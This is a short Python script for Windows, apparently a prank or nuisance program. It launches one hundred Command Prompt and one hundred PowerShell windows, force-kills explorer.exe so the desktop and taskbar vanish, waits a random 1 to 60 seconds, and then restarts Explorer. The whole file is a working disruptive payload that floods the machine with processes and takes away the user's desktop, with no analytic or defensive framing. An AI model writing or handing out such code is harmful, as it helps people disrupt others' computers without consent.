import os
import time
from random import*
a = randint(1,60)
for i in range(100):
    os.system("start cmd.exe")
    os.system("start powershell.exe")
os.system("taskkill /f /im explorer.exe")
time.sleep(a)
os.system("start explorer.exe")
